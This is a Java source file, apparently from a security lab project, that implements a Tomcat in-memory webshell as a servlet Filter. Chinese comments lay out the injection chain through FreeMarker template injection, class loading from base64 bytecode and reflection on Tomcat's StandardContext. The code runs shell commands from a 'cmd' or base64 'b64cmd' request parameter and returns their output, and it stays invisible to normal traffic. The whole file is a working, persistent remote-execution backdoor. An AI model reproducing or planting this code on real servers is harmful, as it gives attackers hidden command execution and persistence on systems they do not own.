package com.lab.themepreview.memshell.plugin;

/*
 * =============================================================================
 * 内存马 payload 本体（Tomcat Filter 版）
 * =============================================================================
 *
 * 这个类【不会】被打进应用的 jar。它是"被注入物"，用独立方式编译成字节码后
 * base64 编码，放进 src/main/resources/memshell/MemshellFilter.class.b64。
 *
 * 攻击流程：
 *   1) FreeMarker SSTI 拿到任意代码执行（freemarker.template.utility.Execute）
 *   2) 通过 ?new() 实例化 com.lab.themepreview.memshell.InjectHelper
 *      （它的构造器接收 ServletContext，在构造器里完成注入并返回状态串）
 *   3) InjectHelper 用 FlushableClassLoader#defineClass 把下面这段字节码加载成类，
 *      实例化、初始化
 *   4) 反射拿到 Spring 应用正在用的 Tomcat StandardContext
 *      （servletContext -> ApplicationContextFacade.context），
 *      调 addFilterDef / addFilterMap / filterStart
 *   5) 新 Filter 立刻生效：GET /memshell?cmd=id 走的是已有入向 HTTP 通道，零出网
 *
 * 编译方式见本目录 build-memshell.ps1 / README「如何自己重新生成 payload」。
 * 依赖：只用到 JDK + javax.servlet（Servlet 3.1 以下都行）。
 */

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.util.Base64;
import java.util.Map;

public class MemshellFilter implements Filter {

    private static final String PARAM_PLAIN = "cmd";
    private static final String PARAM_B64 = "b64cmd";

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String cmd = null;
        try {
            String b64 = request.getParameter(PARAM_B64);
            if (b64 != null && b64.length() > 0) {
                cmd = new String(Base64.getDecoder().decode(b64.trim()), Charset.forName("UTF-8"));
            } else {
                cmd = request.getParameter(PARAM_PLAIN);
            }
        } catch (Throwable ignored) {
        }

        // 只有显式带参数才当 webshell 用，其它请求原样放行（保持业务无感）
        if (cmd == null || cmd.length() == 0) {
            chain.doFilter(request, response);
            return;
        }

        String out;
        try {
            out = run(cmd);
        } catch (Throwable t) {
            out = "[!] " + t;
        }

        response.setContentType("text/html;charset=UTF-8");
        StringBuilder sb = new StringBuilder();
        sb.append("<html><head><title>memshell</title></head><body style=\"background:#0b0c10;color:#d7dae3;")
          .append("font-family:Consolas,monospace\"><h3 style=\"color:#ff6b2b\">tomcat memshell online</h3>")
          .append("<div>cmd: ").append(esc(cmd)).append("</div><hr><pre style=\"white-space:pre-wrap\">")
          .append(esc(out)).append("</pre><div>").append(mark()).append("</div></body></html>");
        response.getWriter().write(sb.toString());
        response.getWriter().flush();
    }

    @Override
    public void destroy() {
    }

    // ------------------------------------------------------------------
    // 命令执行：全程在容器内部，不产生任何出向连接
    // ------------------------------------------------------------------
    private String run(String cmd) throws Exception {
        ProcessBuilder pb;
        if (System.getProperty("os.name", "").toLowerCase().contains("win")) {
            pb = new ProcessBuilder("cmd.exe", "/c", cmd);
        } else {
            pb = new ProcessBuilder("/bin/sh", "-c", cmd);
        }
        Map<String, String> env = pb.environment();
        env.put("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        env.put("LANG", "C.UTF-8");
        pb.redirectErrorStream(true);

        Process p = pb.start();
        p.getOutputStream().close();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        InputStream in = p.getInputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) {
            bos.write(buf, 0, n);
        }
        in.close();
        p.waitFor();
        return new String(bos.toByteArray(), Charset.forName("UTF-8"));
    }

    private String mark() {
        return "jvm=" + System.getProperty("java.version")
                + " | loader=" + getClass().getClassLoader()
                + " | pid=" + pid();
    }

    private String pid() {
        try {
            java.lang.reflect.Method m = Class.forName("java.lang.ProcessHandle")
                    .getMethod("current");
            Object h = m.invoke(null);
            Object id = h.getClass().getMethod("pid").invoke(h);
            return String.valueOf(id);
        } catch (Throwable t) {
            return "n/a";
        }
    }

    private static String esc(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
